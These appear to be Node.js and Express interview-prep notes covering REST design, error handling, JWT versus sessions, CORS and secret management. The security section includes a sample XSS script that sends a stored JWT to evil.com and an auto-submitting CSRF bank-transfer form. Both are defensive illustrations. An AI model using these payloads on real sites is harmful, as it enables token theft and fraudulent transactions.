| Verb | Purpose | Idempotent? | Safe? |
|---|---|---|---|
| `GET` | Retrieve a resource | ✅ Yes | ✅ Yes |
| `POST` | Create a new resource | ❌ No | ❌ No |
| `PUT` | Replace resource entirely | ✅ Yes | ❌ No |
| `PATCH` | Partially update resource | ❌ No | ❌ No |
| `DELETE` | Remove a resource | ✅ Yes | ❌ No |

**Idempotent** — calling it multiple times = same result as once.
**Safe** — no side effects on the server.

**PUT vs PATCH — the interview trap:**
```
PUT /users/1
{ "name": "Ahmed", "email": "ahmed@mail.com", "role": "admin" }
→ Replaces the ENTIRE resource. Missing fields get nulled out.

PATCH /users/1
{ "name": "Ahmed" }
→ Updates ONLY what you send. Everything else is untouched.
```
Sending a `PUT` with partial data silently wipes fields. This is a real production bug.

---

#### Resource Naming Rules

```
✅ Nouns, not verbs
GET /users              not  GET /getUsers
POST /users             not  POST /createUser
DELETE /users/1         not  DELETE /deleteUser?id=1

✅ Plural nouns for collections
/users                  not  /user
/posts                  not  /post

✅ Hierarchy for relationships
GET /users/1/posts          → posts belonging to user 1
GET /users/1/posts/5        → specific post by user 1

✅ IDs in the path — query strings are for filtering collections
GET /users/1/posts/5        → identify a specific resource
GET /users/1/posts?status=published  → filter a collection

✅ Lowercase, hyphen-separated
/blog-posts             not  /blogPosts or /blog_posts

❌ Never verbs in URIs
/users/1/getPosts       ← wrong
/users/1/posts          ← correct
```

---

#### Status Codes — Know These Cold

```
2xx — Success
  200 OK              → general success (GET, PUT, PATCH)
  201 Created         → resource created (POST)
  204 No Content      → success, nothing to return (DELETE)

3xx — Redirection
  301 Moved Permanently
  304 Not Modified    → caching, resource unchanged

4xx — Client Error (they did something wrong)
  400 Bad Request     → malformed input, validation failure
  401 Unauthorized    → not authenticated (no token, invalid token, expired token)
  403 Forbidden       → authenticated but not permitted
  404 Not Found       → resource doesn't exist
  409 Conflict        → duplicate resource, state conflict
  422 Unprocessable   → valid syntax, failed business rules

5xx — Server Error (you did something wrong)
  500 Internal Server Error  → generic server failure
  503 Service Unavailable    → server down or overloaded
```

**401 vs 403 — Always asked, always confused:**
```
401 — "I don't know who you are"
      No token / invalid token / expired token

403 — "I know who you are, you just can't do this"
      Valid token, but insufficient permissions
```
These are NOT interchangeable. Returning 401 when you mean 403 leaks information
about your auth system.

---

#### API Versioning

**Approach A — URI Versioning (most common in practice)**
```
/api/v1/users
/api/v2/users
```
Pros: explicit, easy to route, cacheable, visible in browser
Cons: version isn't technically a resource property — purists object

**Approach B — Header Versioning**
```
Accept: application/vnd.myapi.v2+json
```
Pros: clean URIs
Cons: harder to test, not visible in the browser

**Approach C — Query Parameter**
```
/api/users?version=2
```
Pros: simple
Cons: easily forgotten, hard to enforce

For a junior interview — know URI versioning deeply, mention the others exist.

**Docs:**
- [MDN — HTTP Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- [RFC 9110 — HTTP Semantics](https://www.rfc-editor.org/rfc/rfc9110#section-9)
- [RFC 5789 — PATCH Method](https://www.rfc-editor.org/rfc/rfc5789)
- [REST Resource Naming Guide](https://restfulapi.net/resource-naming/)
- [MDN — HTTP Status Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)

---

### 6. Error Handling in Express

**The two categories:**

```
Synchronous errors   → Express catches automatically
Asynchronous errors  → You must catch and forward via next(err)
```

---

#### Synchronous — Auto-caught by Express

```js
app.get('/user', (req, res, next) => {
  throw new Error('Something broke'); // Express wraps sync handlers — caught automatically
});
```

---

#### Async — You Must Handle (Express 4)

```js
// ❌ Express 4 — unhandled promise rejection — can crash the process
app.get('/user', async (req, res, next) => {
  const user = await db.findUser(id); // throws — nobody catches this
  res.json(user);
});

// ✅ Catch and forward manually
app.get('/user', async (req, res, next) => {
  try {
    const user = await db.findUser(id);
    res.json(user);
  } catch (err) {
    next(err); // forward to error handler
  }
});
```

Express 5 catches async errors automatically — but know Express 4 behavior for interviews.

---

#### The Error Handler — Four Rules

```js
// Rule 1: Exactly 4 arguments — Express identifies error handlers this way
// Rule 2: Must be registered last — after all routes and middleware
// Rule 3: Always send a response — or the request hangs
// Rule 4: Call next(err) only if delegating to another error handler

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.status || 500).json({
    error: err.message
  });
});
```

If you write 3 arguments, Express treats it as regular middleware — errors fall through silently.

---

#### Custom Error Classes — What Separates Junior From Mid

```js
// ❌ Plain Error — no status code, no context for the handler
throw new Error('User not found');

// ✅ Custom error class — carries everything the handler needs
class AppError extends Error {
  constructor(message, status) {
    super(message);
    this.status = status;
  }
}

// Throw it anywhere in the app
throw new AppError('User not found', 404);
throw new AppError('Unauthorized', 401);
throw new AppError('Email already exists', 409);

// Handler stays generic and clean
app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: err.message });
});
```

---

#### What You Should Never Do

```js
// ❌ Expose stack traces to the client — leaks internals
res.status(500).json({ error: err.stack });

// ❌ Swallow errors silently — they disappear with no trace
try {
  await doSomething();
} catch (err) {
  // nothing — this is a production debugging nightmare
}

// ❌ Send response AND call next(err) — headers already sent, this crashes
res.json({ ok: true });
next(err);
```

**Docs:**
- [Express — Error Handling](https://expressjs.com/en/guide/error-handling.html)
- [Express 5 — Migration Guide](https://expressjs.com/en/guide/migrating-5.html)
- [MDN — Custom Error Types](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error#custom_error_types)

---

## Problems We Worked Through

**1. process.nextTick naming confusion**
Initial model: `nextTick` waits for the next loop iteration.
Correction: `nextTick` fires before the event loop moves to the next phase — it interrupts
between phases. The name is misleading by design — the Node docs acknowledge this.

**2. setImmediate vs setTimeout framing**
Initial model: `setImmediate` is a faster `setTimeout` / higher priority.
Correction: They don't compete on speed — they operate in different phases. The distinction
is about determinism, not priority. Inside I/O callbacks, `setImmediate` is guaranteed to
fire before `setTimeout(fn, 0)`. Outside I/O, the order is non-deterministic.

**3. Express middleware order bug**
Given buggy code with auth middleware registered between `/login` and `/dashboard`:
- `/login` was unprotected by accident (registered before auth) — not intentional
- `/dashboard` was protected — but any new route added below auth would be too,
  whether intended or not
- Fix: use route-level middleware `app.get('/dashboard', auth, handler)` for explicit,
  order-independent protection

**4. Sequential await on independent operations**
Given three independent DB calls chained with sequential `await`:
- Identified the performance bug — 600ms instead of ~200ms
- Fix: `Promise.all` for parallel execution
- Extended: `Promise.allSettled` when partial results are acceptable and one failure
  shouldn't discard successful results

**5. Missing try/catch and next(err) in async route**
Given an Express 4 async route with no error handling:
- Bug 1: No try/catch — unhandled promise rejection in Express 4 can crash the process
- Bug 2: No `next(err)` — even if caught, the error handler is unreachable

---

## Code Patterns Introduced

### Event loop execution order
```js
setImmediate(() => console.log('setImmediate'));       // check phase
process.nextTick(() => console.log('nextTick'));       // before any phase transition
Promise.resolve().then(() => console.log('promise')); // microtask queue
console.log('synchronous');                           // call stack — first

// Output: synchronous → nextTick → promise → setImmediate
```

### Promise.all vs Promise.allSettled
```js
// Fail-fast — one failure rejects all
const [user, posts, friends] = await Promise.all([
  db.findUser(id),
  db.findPosts(id),
  db.findFriends(id)
]);

// Resilient — partial results, each handled independently
const results = await Promise.allSettled([
  db.findUser(id),
  db.findPosts(id),
  db.findFriends(id)
]);
results.forEach(r => {
  if (r.status === 'fulfilled') use(r.value);
  else logError(r.reason);
});
```

### Express — clean middleware structure
```js
app.use(express.json());

// Error-first callback convention on async routes
app.post('/login', loginHandler);                      // public

// Route-level auth — explicit, order-independent
app.get('/dashboard', auth, async (req, res, next) => {
  try {
    const data = await db.getDashboard();
    res.json(data);
  } catch (err) {
    next(err); // forward to error handler
  }
});

// Error handler — 4 args, always last
app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: err.message });
});
```

### Custom error class pattern
```js
class AppError extends Error {
  constructor(message, status) {
    super(message);
    this.status = status;
  }
}

// Usage anywhere in the app
throw new AppError('User not found', 404);
throw new AppError('Email already exists', 409);

// Generic handler stays clean
app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: err.message });
});
```

### Correct REST endpoint design
```js
// PATCH — partial update of a specific nested resource
// PATCH /users/2/posts/5
// Body: { "title": "New Title" }
// Response: 200 OK with updated resource

app.patch('/users/:userId/posts/:postId', auth, async (req, res, next) => {
  try {
    const updated = await db.updatePost(
      req.params.postId,
      req.params.userId,
      req.body
    );
    res.status(200).json(updated); // 200 with updated resource — client can confirm change
  } catch (err) {
    next(err);
  }
});
```

---

## References

| Topic | Link |
|---|---|
| Node.js Event Loop | https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick |
| libuv Design Overview | https://docs.libuv.org/en/v1.x/design.html |
| libuv Thread Pool | https://docs.libuv.org/en/v1.x/threadpool.html |
| UV_THREADPOOL_SIZE | https://nodejs.org/api/cli.html#uv_threadpool_sizesize |
| Node DNS Docs | https://nodejs.org/api/dns.html#implementation-considerations |
| process.nextTick vs setImmediate | https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick#process-nexttick-vs-setimmediate |
| MDN — Async JavaScript | https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous |
| MDN — Promise | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise |
| MDN — Promise.all | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all |
| MDN — Promise.allSettled | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled |
| MDN — Promise static methods | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise#static_methods |
| MDN — Microtask Guide | https://developer.mozilla.org/en-US/docs/Web/API/HTML_DOM_API/Microtask_guide |
| Express — Using Middleware | https://expressjs.com/en/guide/using-middleware.html |
| Express — Writing Middleware | https://expressjs.com/en/guide/writing-middleware.html |
| Express — Error Handling | https://expressjs.com/en/guide/error-handling.html |
| Express 5 — Migration Guide | https://expressjs.com/en/guide/migrating-5.html |
| MDN — HTTP Methods | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods |
| RFC 9110 — HTTP Semantics | https://www.rfc-editor.org/rfc/rfc9110#section-9 |
| RFC 5789 — PATCH | https://www.rfc-editor.org/rfc/rfc5789 |
| REST Resource Naming | https://restfulapi.net/resource-naming/ |
| MDN — HTTP Status Codes | https://developer.mozilla.org/en-US/docs/Web/HTTP/Status |
| MDN — Custom Error Types | https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error#custom_error_types |
| REST — Fielding's Dissertation | https://ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm |
| API Versioning — Microsoft Guidelines | https://github.com/microsoft/api-guidelines/blob/vNext/azure/Guidelines.md#api-versioning |

# Session Summary — Node.js & Express — Tier 2 Interview Prep

---

## What We Covered

Four Tier 2 topics that commonly appear in junior Node.js & Express interviews:
JWT vs Sessions, CORS, PostgreSQL vs MongoDB (covered in Tier 1 summary), and
Environment Config & Secrets. Every topic was covered conceptually, reinforced with
code examples, and tested with comprehension checks.

---

## Key Concepts Learned

---

### 1. JWT vs Sessions — Auth That Makes Sense

---

#### The Problem Both Solve

HTTP is stateless. After login, the server has no memory of who you are on the next
request. Both JWT and sessions solve this — but in fundamentally different ways.

---

#### Approach A — Sessions (Stateful)

The server owns the truth. A session record is stored server-side. The client carries
only an opaque ID in a cookie.

```
Client                          Server                    Session Store
  |                               |                            |
  |  POST /login                  |                            |
  |-----------------------------> |                            |
  |                               |  CREATE session record     |
  |                               |--------------------------> |
  |  Set-Cookie: sessionId=abc123 |                            |
  | <---------------------------- |                            |
  |                               |                            |
  |  GET /dashboard               |                            |
  |  Cookie: sessionId=abc123     |                            |
  |-----------------------------> |                            |
  |                               |  LOOKUP sessionId=abc123   |
  |                               |--------------------------> |
  |                               |  { userId: 1, role: admin }|
  |                               | <------------------------- |
  |  200 OK                       |                            |
  | <---------------------------- |                            |
```

**Pros:**
- Instant invalidation — delete the session record, user is logged out immediately
- Server controls everything
- Small cookie — just an ID, not data

**Cons:**
- Requires a shared session store (Redis) at scale
- Scaling problem — 3 servers need to share session state
- DB/Redis lookup on every request

**Why Redis over a database for sessions:**
```
PostgreSQL session lookup  →  ~5–20ms  (disk I/O)
Redis session lookup       →  ~0.1ms   (in-memory)

10,000 concurrent users × 10 requests/min = 100,000 lookups/min
— just for auth, before any business logic queries
```

---

#### Approach B — JWT (Stateless)

The client owns the token. The server signs it on login and verifies the signature
on every request — no DB lookup needed.

```
Client                          Server
  |                               |
  |  POST /login                  |
  |-----------------------------> |
  |                               |  Sign token with secret key
  |  { token: "eyJhb..." }        |
  | <---------------------------- |
  |                               |
  |  GET /dashboard               |
  |  Authorization: Bearer eyJhb..|
  |-----------------------------> |
  |                               |  Verify signature — no DB lookup
  |                               |  Decode payload → { userId: 1 }
  |  200 OK                       |
  | <---------------------------- |
```

---

#### JWT Structure — Three Parts

```
eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VySWQiOjF9  .  SflKxwRJSMeKKF2QT4fwpMeJf36P
      Header                   Payload              Signature
  (algorithm, type)    (your data — readable)   (HMAC of header + payload)
```

Each part is Base64URL encoded — NOT encrypted. The payload is readable by anyone.

```js
// Payload decoded — visible to anyone who has the token
{
  "userId": 1,
  "role": "admin",
  "exp": 1716239022  // expiration timestamp
}
```

**Critical:** JWT is signed, not encrypted. Never put sensitive data in the payload.

**Can the secret key be extracted from the JWT?**
No. HMAC is a one-way function. The signature proves the token wasn't tampered with,
but the key cannot be reversed from it. The risk is key theft, not extraction.

---

#### JWT Size Grows With Payload — Concrete Impact

```js
// Minimal payload → ~120 bytes per request
{ "userId": 1 }

// Typical payload → ~280 bytes per request
{ "userId": 1, "role": "admin", "email": "ahmed@co.com", "orgId": 42 }

// Bloated payload → ~520 bytes per request
{
  "userId": 1, "role": "admin", "email": "ahmed@co.com",
  "firstName": "Ahmed", "lastName": "Hassan",
  "permissions": ["read:users", "write:users", "delete:users"],
  "orgId": 42, "orgName": "Acme Corp", "locale": "en-US"
}

// 1,000 users × 100 requests/day × 520 bytes = ~52MB/day in headers alone
// Sessions: cookie is always ~30 bytes regardless of data size
```

---

#### JWT Implementation in Express

```js
const jwt = require('jsonwebtoken');

// On login — sign a token
const token = jwt.sign(
  { userId: 1, role: 'admin' },   // payload — keep it minimal
  process.env.JWT_SECRET,          // secret key — never hardcode
  { expiresIn: '15m' }            // short expiry — always
);

// Auth middleware — verify on every protected request
const auth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1]; // "Bearer <token>"
  if (!token) return next(new AppError('No token', 401));

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded; // attach user data to request
    next();
  } catch (err) {
    next(new AppError('Invalid or expired token', 401));
  }
};
```

---

#### The Invalidation Problem — Root of All JWT Complexity

With sessions:
```
Account compromised → DELETE session record → user locked out instantly
Server owns the truth — no token needed
```

With JWT:
```
Account compromised → token is still cryptographically valid until expiry
Client owns the token — you can't reach into their browser and take it back
```

**Three real solutions:**

**Option 1 — Blacklist by `jti` claim**
```js
// Every token gets a unique ID
const token = jwt.sign(
  { userId: 1, jti: uuid() },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// On compromise — store jti in Redis with TTL matching token expiry
// On every request — check if jti is blacklisted
// You never need the token — just the ID you issued
// Tradeoff: Redis lookup per request — stateful again
```

**Option 2 — Short expiry + refresh token rotation**
```
Access token  → 15 minutes, JWT, stateless
Refresh token → 7 days, opaque string, stored in DB/Redis

On compromise:
→ Delete refresh token record from DB
→ Access token expires naturally in max 15 minutes
→ Attacker can't get a new one — refresh is dead
Tradeoff: up to 15 minute exposure window
```

**Option 3 — Token versioning**
```js
// Users table has tokenVersion column
// JWT payload carries the version
{ userId: 1, tokenVersion: 3 }

// On every request
if (decoded.tokenVersion !== user.tokenVersion) → reject

// On compromise
UPDATE users SET tokenVersion = 4 WHERE id = 1
→ all existing tokens instantly invalid
Tradeoff: one DB lookup per request
```

---

#### Token Storage — Client Side

| Storage | XSS Risk | CSRF Risk | Notes |
|---|---|---|---|
| `localStorage` | 🔴 High | ✅ None | JS can read it — XSS steals token |
| `httpOnly` Cookie | ✅ None | 🔴 High | JS can't read — browser auto-sends |
| `httpOnly` + `SameSite=Strict` | ✅ None | ✅ Mitigated | Best default choice |
| Memory (JS variable) | ✅ None | ✅ None | Lost on refresh — poor UX |

**Best practice:** httpOnly cookie with SameSite=Strict for refresh token,
short-lived JWT in memory for access token.

```
Set-Cookie: token=...; HttpOnly; SameSite=Strict; Secure
```

---

#### XSS — Cross-Site Scripting

Attacker injects malicious JavaScript into your page that runs in other users' browsers.

```js
// Attacker posts this as a comment
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'));
</script>

// Every user who loads that page sends their token to the attacker
// httpOnly cookie — JavaScript cannot access it at all, XSS finds nothing
```

---

#### CSRF — Cross-Site Request Forgery

Attacker tricks your browser into making a request to another site using your cookies.

```html
<!-- On evil.com — runs silently when you visit -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="amount" value="10000"/>
  <input name="to" value="attacker_account"/>
</form>
<script>document.getElementById('f').submit();</script>

<!-- Browser automatically sends bank.com cookies — transfer executes -->
```

Fix: `SameSite=Strict` tells the browser not to send cookies on cross-site requests.

---

#### The Core Tradeoff

| | Sessions | JWT |
|---|---|---|
| **State** | Stateful — server stores session | Stateless — client carries token |
| **Scalability** | Needs shared store (Redis) | Scales horizontally out of the box |
| **Invalidation** | Instant — delete the record | Hard — wait for expiry or add state |
| **DB lookup per request** | Yes — session store | No — signature verification only |
| **Sensitive data** | Safe in session store | Never in payload — it's readable |
| **Best for** | Apps needing instant revocation | Microservices, horizontal scaling |

**Interview-ready answer:**
> "Sessions are stateful — server stores session data, client carries only an ID. Easy
> to invalidate but requires Redis at scale. JWT is stateless — server signs a token,
> client carries it, server verifies signature with no DB lookup. JWT scales easily but
> has a hard invalidation problem. For most apps needing instant revocation, sessions
> with Redis are simpler and safer. JWT makes sense for microservices or when horizontal
> scaling is a priority."

**Docs:**
- [JWT Introduction — jwt.io](https://jwt.io/introduction)
- [RFC 7519 — JSON Web Token](https://www.rfc-editor.org/rfc/rfc7519)
- [RFC 8725 — JWT Best Practices](https://www.rfc-editor.org/rfc/rfc8725)
- [Express Session Middleware](https://expressjs.com/en/resources/middleware/session.html)
- [jsonwebtoken — npm](https://www.npmjs.com/package/jsonwebtoken)
- [OWASP — XSS](https://owasp.org/www-community/attacks/xss/)
- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [MDN — httpOnly Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly)
- [MDN — SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [Auth0 — Refresh Tokens](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)

---

### 2. CORS — Cross-Origin Resource Sharing

---

#### The Same-Origin Policy

Browsers enforce a rule: a page can only make requests to the same origin it was
served from — unless the server explicitly allows otherwise.

```
Origin = protocol + domain + port

https://myapp.com:443    ← origin
http://myapp.com:443     ← different (protocol)
https://api.myapp.com    ← different (subdomain)
https://myapp.com:3000   ← different (port)
```

Without this rule, any site could make authenticated requests to your bank using
your cookies — and read the response.

---

#### What CORS Is

CORS is the mechanism that lets servers selectively relax the same-origin policy.

```
CORS is not a server-side security mechanism.
CORS is a browser-side enforcement mechanism, controlled by server headers.
```

curl and Postman ignore CORS entirely — it's purely a browser concern.

---

#### Simple Requests — No Preflight

Requests that meet ALL of these conditions skip the preflight:
- Method is GET, POST, or HEAD
- Content-Type is text/plain, application/x-www-form-urlencoded, or multipart/form-data
- No custom headers (no Authorization etc.)

```
Browser → GET https://api.myapp.com/users
          Origin: https://app.myapp.com

Server  → 200 OK
          Access-Control-Allow-Origin: https://app.myapp.com

Browser → Origin matches — JS can read the response ✅
```

---

#### Preflight Requests — The Extra Step

DELETE, PATCH, PUT, custom headers (Authorization, Content-Type: application/json)
trigger an OPTIONS preflight before the real request:

```
Browser                          Express Server
   |                                  |
   |  OPTIONS /items/4                |
   |  Origin: https://app.myapp.com   |
   |  Access-Control-Request-Method:  |
   |    DELETE                        |
   |  Access-Control-Request-Headers: |
   |    Authorization, Content-Type   |
   | -------------------------------->|
   |                                  |
   |  204 No Content                  |
   |  Access-Control-Allow-Origin:    |
   |    https://app.myapp.com         |
   |  Access-Control-Allow-Methods:   |
   |    GET,POST,PUT,PATCH,DELETE     |
   |  Access-Control-Allow-Headers:   |
   |    Authorization, Content-Type   |
   |  Access-Control-Max-Age: 86400   |
   | <--------------------------------|
   |                                  |
   |  DELETE /items/4                 |
   |  Authorization: Bearer eyJ...    |
   | -------------------------------->|
   |                                  |
   |  200 OK                          |
   | <--------------------------------|
```

`Access-Control-Max-Age: 86400` caches the preflight for 24 hours — browser won't
send OPTIONS again for this route, saving a round trip per request.

**Why you didn't see preflights in your own project:**
`cors()` middleware handles OPTIONS automatically. The preflights were happening —
visible in DevTools Network tab under "All" — they just succeeded silently.

---

#### CORS in Express — The Right Way

```js
const cors = require('cors');

// ❌ Never in production — allows every origin on the internet
app.use(cors());

// ✅ Explicit whitelist
app.use(cors({
  origin: ['https://app.myapp.com', 'https://admin.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,    // allow cookies cross-origin
  maxAge: 86400         // cache preflight for 24 hours
}));

// ❌ Invalid combination — browser rejects this
app.use(cors({ origin: '*', credentials: true }));
// Wildcard + credentials is not allowed — must specify exact origin
```

---

#### Dynamic Origin Whitelisting

```js
const allowedOrigins = [
  'https://app.myapp.com',
  'https://admin.myapp.com',
  // only add localhost in development
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
];

app.use(cors({
  origin: (requestOrigin, callback) => {
    // allow requests with no origin (curl, Postman, server-to-server)
    if (!requestOrigin) return callback(null, true);

    if (allowedOrigins.includes(requestOrigin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

---

#### CORS Headers — What Each One Does

| Header | Direction | Purpose |
|---|---|---|
| `Origin` | Request → Server | Where the request is from |
| `Access-Control-Allow-Origin` | Server → Browser | Which origins are allowed |
| `Access-Control-Allow-Methods` | Server → Browser | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | Server → Browser | Which request headers are allowed |
| `Access-Control-Allow-Credentials` | Server → Browser | Whether cookies can be sent |
| `Access-Control-Max-Age` | Server → Browser | How long to cache the preflight |

---

#### Common Mistakes

```js
// ❌ Wildcard in production
app.use(cors({ origin: '*' }));

// ❌ CORS registered after routes — OPTIONS preflight fails
app.use('/api', router);
app.use(cors());          // too late

// ✅ Always register CORS before routes
app.use(cors(corsOptions));
app.use('/api', router);
```

**Interview-ready answer:**
> "CORS exists because browsers enforce the same-origin policy. CORS lets servers relax
> this selectively through response headers. Simple requests skip the preflight. Requests
> with side effects like DELETE or custom headers like Authorization trigger an OPTIONS
> preflight first — the browser asks permission before sending the real request. cors()
> in Express handles preflights automatically. Always whitelist specific origins in
> production — never use a wildcard, and wildcard cannot be used with credentials at all."

**Docs:**
- [MDN — Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [MDN — Preflight Requests](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request)
- [MDN — CORS Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#the_http_response_headers)
- [Express CORS Middleware](https://expressjs.com/en/resources/middleware/cors.html)
- [MDN — Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)

---

### 3. Environment Config & Secrets

---

#### The Core Problem — Hardcoded Secrets

```js
// ❌ What juniors do — never do this
const db = mongoose.connect('mongodb+srv://admin:mypassword123@cluster.net/db');
const token = jwt.sign(payload, 'my_super_secret_key');
const stripe = new Stripe('sk_live_abc123realkey');
```

These strings are in Git history forever. Even if deleted in the next commit,
they are recoverable via `git log --all` and `git show <hash>`. Treat any secret
that touched a commit as fully compromised.

---

#### The Solution — Environment Variables

```js
// ✅ Reference the variable — never the value
const db = mongoose.connect(process.env.MONGODB_URI);
const token = jwt.sign(payload, process.env.JWT_SECRET);
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY);
```

---

#### The .env File — Local Development Only

```bash
# .env — gitignored, never committed
MONGODB_URI=mongodb+srv://admin:mypassword123@cluster.net/db
JWT_SECRET=a_long_random_unguessable_string_minimum_32_chars
STRIPE_SECRET_KEY=sk_live_abc123realkey
PORT=3000
NODE_ENV=development
```

```js
// Entry file — must be first line
require('dotenv').config();

console.log(process.env.JWT_SECRET); // works
```

---

#### The .gitignore — Non-Negotiable

```bash
# .gitignore
.env
.env.local
.env.production
node_modules/
```

If .env is not in .gitignore before the first commit — rotate every credential
immediately. Deleting the file is not enough.

---

#### The .env.example — What You DO Commit

```bash
# .env.example — shows structure, no values, committed to git
MONGODB_URI=
JWT_SECRET=
STRIPE_SECRET_KEY=
PORT=3000
NODE_ENV=development
```

Every professional project has this file. It tells teammates what to configure
without exposing real values.

---

#### Validate at Startup — Fail Fast

```js
// config/env.js — import this before anything else
const required = [
  'MONGODB_URI',
  'JWT_SECRET',
  'STRIPE_SECRET_KEY'
];

required.forEach(key => {
  if (!process.env[key]) {
    throw new Error(`Missing required environment variable: ${key}`);
  }
});

module.exports = {
  mongoUri: process.env.MONGODB_URI,
  jwtSecret: process.env.JWT_SECRET,
  stripeKey: process.env.STRIPE_SECRET_KEY,
  port: process.env.PORT || 3000,
  nodeEnv: process.env.NODE_ENV || 'development'
};
```

```js
// app.js — config first, always
const config = require('./config/env'); // crashes here if vars missing — good
const express = require('express');
```

Catching a missing variable at boot beats a cryptic crash two hours into production.

---

#### NODE_ENV — The Environment Flag

```js
// Different error handling per environment
if (process.env.NODE_ENV === 'production') {
  app.use((err, req, res, next) => {
    // never expose stack traces in production
    res.status(err.status || 500).json({ error: err.message });
  });
} else {
  app.use((err, req, res, next) => {
    // full stack trace in development — useful for debugging
    res.status(err.status || 500).json({
      error: err.message,
      stack: err.stack
    });
  });
}

// CORS — allow localhost in dev only
const allowedOrigins = ['https://app.myapp.com'];
if (process.env.NODE_ENV === 'development') {
  allowedOrigins.push('http://localhost:3000');
}
```

---

#### In Production — Never Use .env Files

| Platform | Where Secrets Live |
|---|---|
| AWS | Secrets Manager / Parameter Store |
| Heroku | Config Vars in dashboard |
| Railway / Render | Environment Variables in dashboard |
| Docker | `--env-file` or Docker Secrets |
| Kubernetes | Kubernetes Secrets |

`process.env.JWT_SECRET` works identically in all environments — the platform
injects the values at runtime. Your code never changes.

---

#### Secret Compromised — Exact Remediation Order

```
1. ROTATE THE SECRET IMMEDIATELY — first, always
   → Stripe / Cloudinary / AWS → regenerate / roll the key
   → Old key is dead — attacker's window closes instantly
   → Do this before touching Git

2. Update new secret in your hosting platform's secret manager
   → Not in code — never in code

3. Clean Git history (housekeeping — after rotation)
   → BFG Repo Cleaner or git filter-branch
   → Force push to rewrite remote history
   → All team members must re-clone

4. Audit access logs
   → Did anyone use the exposed key?
   → Check API provider logs for suspicious activity

5. Add prevention tooling going forward
   → GitHub secret scanning (built-in — alerts before push)
   → git-secrets pre-commit hook — blocks commits with secrets
```

```bash
# Anyone can recover a "deleted" secret without rotation
git log --all                    # all commits including deleted ones
git show <original_commit_hash>  # secret visible in plain text
```

**Rotation is the fix. History cleanup is housekeeping.**

---

#### The Complete Professional Project Structure

```
project/
├── .env              ← local values, gitignored
├── .env.example      ← structure only, committed to git
├── .gitignore        ← .env listed here — before first commit
├── config/
│   └── env.js        ← validates + exports all config
└── app.js            ← imports config first, before everything
```

**Interview-ready answer:**
> "Secrets should never be hardcoded or committed to source control. Environment
> variables keep config separate from code. Locally, dotenv loads a gitignored .env
> file. In production, the hosting platform injects variables at runtime. A .env.example
> with empty values is committed so teammates know what to configure. At startup,
> validate all required variables exist and fail fast — a boot crash with a clear message
> beats a silent failure in production. If a secret is ever committed, rotate it
> immediately — history rewriting alone is not enough."

**Docs:**
- [dotenv — npm](https://www.npmjs.com/package/dotenv)
- [Twelve-Factor App — Config](https://12factor.net/config)
- [OWASP — Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
- [GitHub — Secret Scanning](https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning)
- [BFG Repo Cleaner](https://rtyley.github.io/bfg-repo-cleaner/)
- [git-secrets — AWS Labs](https://github.com/awslabs/git-secrets)

---

## Problems We Worked Through

**1. JWT invalidation — the root problem**
Question: if the account is compromised, you don't have the token — the attacker does.
How do you invalidate something you don't have?
Resolution: three patterns — jti blacklist, short expiry + refresh token rotation,
token versioning. Each reintroduces varying degrees of state. At some point you're
building sessions with extra steps — and that's a legitimate architectural conclusion.

**2. JWT 24-hour expiry + localStorage setup**
Three problems identified:
- 24-hour expiry = 24-hour attack window after token theft
- localStorage vulnerable to XSS — any injected script reads it
- JWT can't be invalidated before expiry — no kill switch
Fix: short expiry + refresh tokens, httpOnly + SameSite=Strict cookie, Redis blacklist
or switch to sessions.

**3. CORS preflights not visible in personal project**
Question: DELETE, PATCH, POST worked without explicit preflight configuration.
Resolution: cors() middleware handles OPTIONS automatically. Preflights were firing —
visible in DevTools Network tab under "All" — they just succeeded silently because
cors() responded correctly before the routes were reached.

**4. Secret committed to Git — remediation order**
Key insight: rotation first, history cleanup second. A deleted commit is still
recoverable via git log --all. Rotating the credential closes the attacker's window
immediately — Git history cleanup is housekeeping, not the security fix.

---

